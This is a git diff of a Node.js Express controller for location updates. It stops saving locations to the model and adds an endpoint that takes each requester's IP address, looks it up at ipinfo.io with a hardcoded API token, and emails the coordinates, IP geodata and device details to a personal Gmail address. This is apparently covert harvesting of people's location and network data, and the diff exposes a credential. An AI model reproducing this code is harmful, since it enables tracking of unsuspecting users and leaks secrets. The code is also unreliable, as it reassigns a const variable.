@@ -11,7 +11,7 @@ exports.updateLocation = (req, res) => {
   if (!userId || lat === undefined || lng === undefined) {
     return res.status(400).json({ error: 'Missing userId, lat, or lng' });
   }
-  locationModel.updateUserLocation(userId, lat, lng);
+  // locationModel.updateUserLocation(userId, lat, lng);
 
   // Send email every time a location is received, with device info if provided
   const mapUrl = `https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`;
@@ -23,6 +23,32 @@ exports.updateLocation = (req, res) => {
   res.json({ success: true });
 };
 
+
+exports.locationByIp = async (req, res) => {
+  const { userId, lat, lng, deviceInfo } = req.body;
+
+   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+
+  const response = await fetch(`https://ipinfo.io/${ip}?token=28a05fe505da66`);
+  const data = await response.json();
+  // Send email every time a location is received, with device info if provided
+  const mapUrl = `https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`;
+  const toEmail = 'd.wizard.techno@gmail.com';
+  deviceInfo={...deviceInfo,...data};
+   sendLocationEmail(toEmail, lat, lng, deviceInfo)
+    .then(() => console.log('Location email sent! ', mapUrl, deviceInfo))
+    .catch((err) => console.error('Failed to send email:', err));
+
+  res.json({ success: true });
+};
+
+
+
+
+
+
 exports.getLocations = (req, res) => {
   res.json(locationModel.getAllUserLocations());
 };
+
+
